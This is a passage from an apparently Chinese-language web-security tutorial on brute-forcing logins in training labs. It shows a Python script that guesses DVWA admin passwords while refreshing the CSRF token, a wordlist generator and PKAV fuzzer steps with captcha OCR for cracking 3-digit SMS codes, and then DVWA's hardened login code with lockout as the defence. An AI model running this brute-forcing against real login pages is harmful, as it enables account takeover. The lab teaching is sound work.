data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">for</span> password <span class=\"token keyword\">in</span> lines<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            user_token <span class=\"token operator\">=</span> get_token<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers_index<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token string-interpolation\"><span class=\"token string\">f'</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>url<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">?username=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>username<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">&amp;password=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>password<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">&amp;Login=Login&amp;user_token=</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>user_token<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>                headers<span class=\"token operator\">=</span>headers_index<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            match1 <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'welcome'</span><span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">.</span>IGNORECASE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            match2 <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'success'</span><span class=\"token punctuation\">,</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">,</span> re<span class=\"token punctuation\">.</span>IGNORECASE<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>username <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> password <span class=\"token operator\">+</span> <span class=\"token string\">\" \"</span> <span class=\"token operator\">+</span> user_token<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            <span class=\"token keyword\">if</span> match1 <span class=\"token keyword\">or</span> match2<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'暴力破解成功！！！'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"用户名：\"</span> <span class=\"token operator\">+</span> username <span class=\"token operator\">+</span> <span class=\"token string\">\"\\n密码：\"</span> <span class=\"token operator\">+</span> password<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    headers_index <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token string\">'User-Agent'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token string\">'Accept'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        <span class=\"token string\">'Accept-Encoding'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'gzip, deflate, br'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token string\">'Accept-Language'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'zh-CN,zh;q=0.9'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token string\">'Cookie'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'PHPSESSID=2g9qv1v696bifnqv2uc6j71iq5; security=high'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token string\">'Connection'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'keep-alive'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token string\">'Upgrade-Insecure-Requests'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    url <span class=\"token operator\">=</span> <span class=\"token string\">'http://192.168.23.129:8001/vulnerabilities/brute/index.php'</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    password_path <span class=\"token operator\">=</span> <span class=\"token string\">\"top1000.txt\"</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    username <span class=\"token operator\">=</span> <span class=\"token string\">'admin'</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    brute<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> headers_index<span class=\"token operator\">=</span>headers_index<span class=\"token punctuation\">,</span> username<span class=\"token operator\">=</span>username<span class=\"token punctuation\">,</span> password_path<span class=\"token operator\">=</span>password_path<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240711094713556.png\" alt=\"image-20240711094713556\" /></p>\n<h3 id=\"带图片验证码爆破\"><a class=\"anchor\" href=\"#带图片验证码爆破\">#</a> 带图片验证码爆破</h3>\n<p>靶场地址：<a href=\"http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php\">http://lab1.xseclab.com/vcode7_f7947d56f22133dbc85dda4f28530268/index.php</a></p>\n<p><img loading=\"lazy\" data-src=\"image-20240711095018227.png\" alt=\"image-20240711095018227\" /></p>\n<p>爆破手机验证码 (3 位数字)，识别数字验证码</p>\n<p>工具 PKAV HTTP Fuzzer：<a href=\"https://github.com/estell-yf/PKAV\">https://github.com/estell-yf/PKAV</a></p>\n<p>使用 python 编写脚本，生成 3 位数字手机验证码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"dic.txt\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"w\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">for</span> z <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>x<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>y<span class=\"token punctuation\">&#125;</span></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>z<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\\n\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>先点击获取手机验证码，然后随便输入手机验证码和验证码，用 bp 抓包，将请求包复制到 pkav 的变体设置中，标记好手机验证码和图片验证码，导入生成的手机验证码字典</p>\n<p><img loading=\"lazy\" data-src=\"image-20240711104036951.png\" alt=\"image-20240711104036951\" /></p>\n<p>复制图片验证码的图片地址，粘贴到 pkav 的图片验证码识别模块中，点击设别测试，测试是否能识别成功</p>\n<p><img loading=\"lazy\" data-src=\"image-20240711104333506.png\" alt=\"image-20240711104333506\" /></p>\n<p>选择 pkav 的重放选择，验证码识别重放模式设置为单线程，验证码长度固定 4 位</p>\n<p><img loading=\"lazy\" data-src=\"image-20240711104606909.png\" alt=\"image-20240711104606909\" /></p>\n<p>进入 pkav 的发包器模块，粘贴目标网址，点击启动，遍历完后，选择长度最短的即为正确的验证码，点击返回包得到 flag。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240711104958004.png\" alt=\"image-20240711104958004\" /></p>\n<h3 id=\"暴力破解防护措施\"><a class=\"anchor\" href=\"#暴力破解防护措施\">#</a> 暴力破解防护措施</h3>\n<p>参考一下 DVWA 暴力破解模块 - impossible 的代码</p>\n<p><strong>DVWA 暴力破解模块 - impossible</strong></p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token keyword\">isset</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\">// Check Anti-CSRF token</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token function\">checkToken</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'user_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'session_token'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'index.php'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">// Sanitise username input</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'username'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 去反斜杠</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token variable\">$user</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$user</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token comment\">// Sanitise password input</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'password'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">stripslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">is_object</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token function\">mysqli_real_escape_string</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GLOBALS</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"___mysqli_ston\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>  <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">:</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function\">trigger_error</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">E_USER_ERROR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token string double-quoted-string\">\"\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$pass</span> <span class=\"token operator\">=</span> <span class=\"token function\">md5</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$pass</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token comment\">// Default values</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$total_failed_login</span> <span class=\"token operator\">=</span> <span class=\"token number\">3</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$lockout_time</span>       <span class=\"token operator\">=</span> <span class=\"token number\">15</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token variable\">$account_locked</span>     <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token comment\">// Check the database (Check user information)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token comment\">// 获取用户的登录失败次数和最后登录时间</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token comment\">// Check to see if the user has been locked out.</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token variable\">$total_failed_login</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>  <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// User locked out.  Note, using this method would allow for user enumeration!</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token comment\">//echo \"&lt;pre>&lt;br />This account has been locked due to too many incorrect logins.&lt;/pre>\";</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token comment\">// Calculate when the user would be allowed to login again</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token variable\">$last_login</span> <span class=\"token operator\">=</span> <span class=\"token function\">strtotime</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token variable\">$timeout</span>    <span class=\"token operator\">=</span> <span class=\"token variable\">$last_login</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$lockout_time</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token variable\">$timenow</span>    <span class=\"token operator\">=</span> <span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        <span class=\"token comment\">/*</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        print \"The last login was: \" . date (\"h:i:s\", $last_login) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        print \"The timenow is: \" . date (\"h:i:s\", $timenow) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        print \"The timeout is: \" . date (\"h:i:s\", $timeout) . \"&lt;br />\";</pre></td></tr><tr><td data-num=\"44\"></td><td><pre>        */</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token comment\">// Check to see if enough time has passed, if it hasn't locked the account</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$timenow</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$timeout</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token comment\">// print \"The account is locked&lt;br />\";</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token comment\">// Check the database (if username matches the password)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>    <span class=\"token variable\">$data</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-></span><span class=\"token function\">prepare</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':user'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$user</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">bindParam</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">':password'</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pass</span><span class=\"token punctuation\">,</span> <span class=\"token class-name static-context\">PDO</span><span class=\"token operator\">::</span><span class=\"token constant\">PARAM_STR</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">execute</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">fetch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    <span class=\"token comment\">// If its a valid login...</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$data</span><span class=\"token operator\">-></span><span class=\"token function\">rowCount</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token punctuation\">(</span> <span class=\"token variable\">$account_locked</span> <span class=\"token operator\">==</span> <span class=\"token constant boolean\">false</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>        <span class=\"token comment\">// Get users details</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>        <span class=\"token variable\">$avatar</span>       <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'avatar'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>        <span class=\"token variable\">$failed_login</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'failed_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>        <span class=\"token variable\">$last_login</span>   <span class=\"token operator\">=</span> <span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'last_login'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>        <span class=\"token comment\">// Login successful</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;p>Welcome to the password protected area &lt;em><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$user</span><span class=\"token punctuation\">&#125;</span></span>&lt;/em>&lt;/p>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;img src=\\\"<span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span><span class=\"token variable\">$avatar</span><span class=\"token punctuation\">&#125;</span></span>\\\" />\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td 